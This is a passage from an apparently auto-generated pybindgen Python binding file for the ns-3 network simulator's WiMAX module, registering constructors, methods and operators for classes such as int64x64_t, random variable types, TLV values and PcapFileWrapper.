[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType'), param('double', 'frameDuration')])
cls.add_method('Install',
'ns3::Ptr< ns3::WimaxNetDevice >',
[param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::Ptr< ns3::WimaxChannel >', 'channel'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('SetPropagationLossModel',
'void',
[param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propagationModel')])
cls.add_method('EnableAsciiInternal',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename')],
visibility='private', is_virtual=True)
cls.add_method('EnablePcapInternal',
'void',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename'), param('bool', 'promiscuous')],
visibility='private', is_virtual=True)
return
def register_Ns3ZetaVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ZetaVariable const &', 'arg0')])
cls.add_constructor([param('double', 'alpha')])
cls.add_constructor([])
return
def register_Ns3ZipfVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ZipfVariable const &', 'arg0')])
cls.add_constructor([param('long int', 'N'), param('double', 'alpha')])
cls.add_constructor([])
return
def register_Ns3Empty_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::empty const &', 'arg0')])
return
def register_Ns3Int64x64_t_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_inplace_numeric_operator('+=', param('ns3::int64x64_t const &', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))
cls.add_unary_numeric_operator('-')
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))
cls.add_binary_comparison_operator('<')
cls.add_binary_comparison_operator('>')
cls.add_inplace_numeric_operator('*=', param('ns3::int64x64_t const &', 'right'))
cls.add_inplace_numeric_operator('-=', param('ns3::int64x64_t const &', 'right'))
cls.add_inplace_numeric_operator('/=', param('ns3::int64x64_t const &', 'right'))
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('<=')
cls.add_binary_comparison_operator('==')
cls.add_binary_comparison_operator('>=')
cls.add_constructor([])
cls.add_constructor([param('double', 'v')])
cls.add_constructor([param('int', 'v')])
cls.add_constructor([param('long int', 'v')])
cls.add_constructor([param('long long int', 'v')])
cls.add_constructor([param('unsigned int', 'v')])
cls.add_constructor([param('long unsigned int', 'v')])
cls.add_constructor([param('long long unsigned int', 'v')])
cls.add_constructor([param('int64_t', 'hi'), param('uint64_t', 'lo')])
cls.add_constructor([param('ns3::int64x64_t const &', 'o')])
cls.add_method('GetDouble',
'double',
[],
is_const=True)
cls.add_method('GetHigh',
'int64_t',
[],
is_const=True)
cls.add_method('GetLow',
'uint64_t',
[],
is_const=True)
cls.add_method('Invert',
'ns3::int64x64_t',
[param('uint64_t', 'v')],
is_static=True)
cls.add_method('MulByInvert',
'void',
[param('ns3::int64x64_t const &', 'o')])
return
def register_Ns3SimpleOfdmSendParam_methods(root_module, cls):
cls.add_constructor([param('ns3::simpleOfdmSendParam const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::bvec const &', 'fecBlock'), param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'Frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPowerDbm')])
cls.add_constructor([param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'Frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPowerDbm'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('GetBurst',
'ns3::Ptr< ns3::PacketBurst >',
[])
cls.add_method('GetBurstSize',
'uint32_t',
[])
cls.add_method('GetDirection',
'uint8_t',
[])
cls.add_method('GetFecBlock',
'ns3::bvec',
[])
cls.add_method('GetFrequency',
'uint64_t',
[])
cls.add_method('GetIsFirstBlock',
'bool',
[])
cls.add_method('GetModulationType',
'ns3::WimaxPhy::ModulationType',
[])
cls.add_method('GetRxPowerDbm',
'double',
[])
cls.add_method('SetBurstSize',
'void',
[param('uint32_t', 'burstSize')])
cls.add_method('SetDirection',
'void',
[param('uint8_t', 'direction')])
cls.add_method('SetFecBlock',
'void',
[param('ns3::bvec const &', 'fecBlock')])
cls.add_method('SetFrequency',
'void',
[param('uint64_t', 'Frequency')])
cls.add_method('SetIsFirstBlock',
'void',
[param('bool', 'isFirstBlock')])
cls.add_method('SetModulationType',
'void',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('SetRxPowerDbm',
'void',
[param('double', 'rxPowerDbm')])
return
def register_Ns3Chunk_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Chunk const &', 'arg0')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3ClassificationRuleVectorTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::ClassificationRuleVectorTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::ClassificationRuleVectorTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
return
def register_Ns3ConstantVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ConstantVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'c')])
cls.add_method('SetConstant',
'void',
[param('double', 'c')])
return
def register_Ns3CsParamVectorTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::CsParamVectorTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::CsParamVectorTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
return
def register_Ns3DeterministicVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::DeterministicVariable const &', 'arg0')])
cls.add_constructor([param('double *', 'd'), param('uint32_t', 'c')])
return
def register_Ns3EmpiricalVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::EmpiricalVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CDF',
'void',
[param('double', 'v'), param('double', 'c')])
return
def register_Ns3ErlangVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ErlangVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('unsigned int', 'k'), param('double', 'lambda')])
cls.add_method('GetValue',
'double',
[],
is_const=True)
cls.add_method('GetValue',
'double',
[param('unsigned int', 'k'), param('double', 'lambda')],
is_const=True)
return
def register_Ns3ExponentialVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ExponentialVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'm')])
cls.add_constructor([param('double', 'm'), param('double', 'b')])
return
def register_Ns3GammaVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::GammaVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'alpha'), param('double', 'beta')])
cls.add_method('GetValue',
'double',
[],
is_const=True)
cls.add_method('GetValue',
'double',
[param('double', 'alpha'), param('double', 'beta')],
is_const=True)
return
def register_Ns3Header_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::Header const &', 'arg0')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3IntEmpiricalVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::IntEmpiricalVariable const &', 'arg0')])
cls.add_constructor([])
return
def register_Ns3Ipv4AddressTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::Ipv4AddressTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('ns3::Ipv4Address', 'address'), param('ns3::Ipv4Mask', 'Mask')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::Ipv4AddressTlvValue::ipv4Addr const *, std::vector< ns3::Ipv4AddressTlvValue::ipv4Addr > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::Ipv4AddressTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::Ipv4AddressTlvValue::ipv4Addr const *, std::vector< ns3::Ipv4AddressTlvValue::ipv4Addr > >',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3Ipv4AddressTlvValueIpv4Addr_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4AddressTlvValue::ipv4Addr const &', 'arg0')])
cls.add_instance_attribute('Address', 'ns3::Ipv4Address', is_const=False)
cls.add_instance_attribute('Mask', 'ns3::Ipv4Mask', is_const=False)
return
def register_Ns3LogNormalVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::LogNormalVariable const &', 'arg0')])
cls.add_constructor([param('double', 'mu'), param('double', 'sigma')])
return
def register_Ns3MacHeaderType_methods(root_module, cls):
cls.add_constructor([param('ns3::MacHeaderType const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint8_t', 'type')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
return
def register_Ns3ManagementMessageType_methods(root_module, cls):
cls.add_constructor([param('ns3::ManagementMessageType const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint8_t', 'type')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
return
def register_Ns3NormalVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::NormalVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'm'), param('double', 'v')])
cls.add_constructor([param('double', 'm'), param('double', 'v'), param('double', 'b')])
return
def register_Ns3Object_methods(root_module, cls):
cls.add_constructor([])
cls.add_method('AggregateObject',
'void',
[param('ns3::Ptr< ns3::Object >', 'other')])
cls.add_method('Dispose',
'void',
[])
cls.add_method('GetAggregateIterator',
'ns3::Object::AggregateIterator',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Start',
'void',
[])
cls.add_constructor([param('ns3::Object const &', 'o')],
visibility='protected')
cls.add_method('DoDispose',
'void',
[],
visibility='protected', is_virtual=True)
cls.add_method('DoStart',
'void',
[],
visibility='protected', is_virtual=True)
cls.add_method('NotifyNewAggregate',
'void',
[],
visibility='protected', is_virtual=True)
return
def register_Ns3ObjectAggregateIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::Object::AggregateIterator const &', 'arg0')])
cls.add_constructor([])
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::Ptr< ns3::Object const >',
[])
return
def register_Ns3OfdmDownlinkFramePrefix_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmDownlinkFramePrefix const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddDlFramePrefixElement',
'void',
[param('ns3::DlFramePrefixIe', 'dlFramePrefixElement')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetBaseStationId',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetConfigurationChangeCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetDlFramePrefixElements',
'std::vector< ns3::DlFramePrefixIe >',
[],
is_const=True)
cls.add_method('GetFrameNumber',
'uint32_t',
[],
is_const=True)
cls.add_method('GetHcs',
'uint8_t',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetBaseStationId',
'void',
[param('ns3::Mac48Address', 'baseStationId')])
cls.add_method('SetConfigurationChangeCount',
'void',
[param('uint8_t', 'configurationChangeCount')])
cls.add_method('SetFrameNumber',
'void',
[param('uint32_t', 'frameNumber')])
cls.add_method('SetHcs',
'void',
[param('uint8_t', 'hcs')])
return
def register_Ns3OfdmSendParams_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmSendParams const &', 'arg0')])
cls.add_constructor([param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('uint8_t', 'modulationType'), param('uint8_t', 'direction')])
cls.add_method('GetBurst',
'ns3::Ptr< ns3::PacketBurst >',
[],
is_const=True)
cls.add_method('GetDirection',
'uint8_t',
[],
is_const=True)
cls.add_method('GetModulationType',
'uint8_t',
[],
is_const=True)
return
def register_Ns3OfdmUcdChannelEncodings_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmUcdChannelEncodings const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetSbchnlFocContCodes',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSbchnlReqRegionFullParams',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('SetSbchnlFocContCodes',
'void',
[param('uint8_t', 'sbchnlFocContCodes')])
cls.add_method('SetSbchnlReqRegionFullParams',
'void',
[param('uint8_t', 'sbchnlReqRegionFullParams')])
cls.add_method('DoRead',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
visibility='private', is_virtual=True)
cls.add_method('DoWrite',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3PacketBurst_methods(root_module, cls):
cls.add_constructor([param('ns3::PacketBurst const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddPacket',
'void',
[param('ns3::Ptr< ns3::Packet >', 'packet')])
cls.add_method('Begin',
'std::_List_const_iterator< ns3::Ptr< ns3::Packet > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::Ptr< ns3::PacketBurst >',
[],
is_const=True)
cls.add_method('End',
'std::_List_const_iterator< ns3::Ptr< ns3::Packet > >',
[],
is_const=True)
cls.add_method('GetNPackets',
'uint32_t',
[],
is_const=True)
cls.add_method('GetPackets',
'std::list< ns3::Ptr< ns3::Packet > >',
[],
is_const=True)
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('DoDispose',
'void',
[],
visibility='private', is_virtual=True)
return
def register_Ns3ParetoVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ParetoVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'm')])
cls.add_constructor([param('double', 'm'), param('double', 's')])
cls.add_constructor([param('double', 'm'), param('double', 's'), param('double', 'b')])
cls.add_constructor([param('std::pair< double, double >', 'params')])
cls.add_constructor([param('std::pair< double, double >', 'params'), param('double', 'b')])
return
def register_Ns3PcapFileWrapper_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('Fail',
'bool',
[],
is_const=True)
cls.add_method('Eof',
'bool',
[],
is_const=True)
cls.add_method('Clear',
'void',
[])
cls.add_method('Open',
'void',
[param('std::string const &', 'filename'), param('std::_Ios_Openmode', 'mode')])
cls.add_method('Close',
'void',
[])
cls.add_method('Init',
'void',
[param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='std::numeric_limits<unsigned int>::max()'), param('int32_t', 'tzCorrection', default_value='ns3::PcapFile::ZONE_DEFAULT')])
cls.add_method('Write',
'void',
[param('ns3::Time', 't'), param('ns3::Ptr< ns3::Packet const >', 'p')])
cls.add_method('Write',
'void',
[param('ns3::Time', 't'), param('ns3::Header &', 'header'), param('ns3::Ptr< ns3::Packet const >', 'p')])
cls.add_method('Write',
'void',
[param('ns3::Time', 't'), param('uint8_t const *', 'buffer'), param('uint32_t', 'length')])
cls.add_method('GetMagic',
'uint32_t',
[])
cls.add_method('GetVersionMajor',
'uint16_t',
[])
cls.add_method('GetVersionMinor',
'uint16_t',
[])
cls.add_method('GetTimeZoneOffset',
'int32_t',
[])
cls.add_method('GetSigFigs',
'uint32_t',
[])
cls.add_method('GetSnapLen',
'uint32_t',
[])
cls.add_method('GetDataLinkType',
'uint32_t',
[])
return
def register_Ns3PortRangeTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::PortRangeTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('uint16_t', 'portLow'), param('uint16_t', 'portHigh')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::PortRangeTlvValue::PortRange const *, std::vector< ns3::PortRangeTlvValue::PortRange > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::PortRangeTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::PortRangeTlvValue::PortRange const *, std::vector< ns3::PortRangeTlvValue::PortRange > >',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3PortRangeTlvValuePortRange_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::PortRangeTlvValue::PortRange const &', 'arg0')])
cls.add_instance_attribute('PortHigh', 'uint16_t', is_const=False)
cls.add_instance_attribute('PortLow', 'uint16_t', is_const=False)
return
def register_Ns3PriorityUlJob_methods(root_module, cls):
cls.add_constructor([param('ns3::PriorityUlJob const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetPriority',
'int',
[])
cls.add_method('GetUlJob',
'ns3::Ptr< ns3::UlJob >',
[])
cls.add_method('SetPriority',
'void',
[param('int', 'priority')])
cls.add_method('SetUlJob',
'void',
[param('ns3::Ptr< ns3::UlJob >', 'job')])
return
def register_Ns3PropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetNext',
'void',
[param('ns3::Ptr< ns3::PropagationLossModel >', 'next')])
cls.add_method('CalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True)
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3ProtocolTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::ProtocolTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('uint8_t', 'protiocol')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< unsigned char const *, std::vector< unsigned char > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::ProtocolTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< unsigned char const *, std::vector< unsigned char > >',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3RandomPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3RangePropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3RngReq_methods(root_module, cls):
cls.add_constructor([param('ns3::RngReq const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetRangingAnomalies',
'uint8_t',
[],
is_const=True)
